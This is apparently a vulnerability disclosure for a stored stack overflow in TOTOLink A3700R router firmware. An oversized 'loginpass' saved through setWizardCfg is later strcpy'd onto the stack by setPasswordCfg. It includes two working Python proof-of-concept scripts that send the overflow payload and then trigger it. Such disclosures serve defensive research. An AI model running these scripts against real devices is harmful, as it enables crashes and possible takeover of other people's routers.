## Overview

A stack-overflow vulnerability exists in the TOTOLink A3700R firmware **V17.0.0cu.557_B20221024**. The `setWizardCfg` handler reads the `loginpass` input and saves it to the configuration key `http_passwd` via `nvram_set`. That value is later read back by `setPasswordCfg` using `nvram_safe_get` and copied into a fixed-size stack buffer. Because `nvram_set`/`nvram_safe_get` do not enforce length limits, an oversized ` http_passwd`can overflow the stack when the value is retrieved — potentially causing crashes or enabling code execution depending on platform mitigations.

## Affected version

V17.0.0cu.557_B20221024

## Firmware download website 

https://www.totolink.net/home/menu/detail/menu_listtpl/download/id/241/ids/36.html

## Vulnerability details

**Endpoint:** `/cgi-bin/cstecgi.cgi`

**topicurl:**`setWizardCfg`

**Input handling:** the `loginpass` parameter is parsed into variable `v3`.

**Storage:** `nvram_set("http_passwd", v3)` persists the input to the device configuration.

![](https://raw.githubusercontent.com/abcdefg-png/images2/main/%E5%B1%80%E9%83%A8%E6%88%AA%E5%8F%96_20251006_180910.png)

**Endpoint:** `/cgi-bin/cstecgi.cgi`

**topicurl:**`setPasswordCfg`

**Retrieval:**`nvram_safe_get("http_passwd")`，The value of the v4 variable is copied into the stack variable v10 using the strcpy function, which may lead to a stack overflow.

![](https://raw.githubusercontent.com/abcdefg-png/images2/main/%E5%B1%80%E9%83%A8%E6%88%AA%E5%8F%96_20251006_182450.png)

## Poc

1. Storage setWizardCfg

```python
import requests
url = "http://192.168.0.1/cgi-bin/cstecgi.cgi"
cookie = {"Cookie":"SESSION_ID=2:1721039211:2"}
data = {"loginpass":"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa","topicurl":"setWizardCfg"}
response = requests.post(url, cookies=cookie, json=data)
print(response.text)
print(response)
```

2. Trigger Stack Overflow Vulnerability

```python
import requests
url = "http://192.168.0.1/cgi-bin/cstecgi.cgi"
cookie = {"Cookie":"SESSION_ID=2:1721039211:2"}
data = {"admuser":"admin","admpass":"admin","origPass":"admin","topicurl":"setPasswordCfg"}
response = requests.post(url, cookies=cookie, json=data)
print(response.text)
print(response)
```

3. Successfully triggered attack

![](https://raw.githubusercontent.com/abcdefg-png/images2/main/%E5%B1%80%E9%83%A8%E6%88%AA%E5%8F%96_20251005_091337.png)
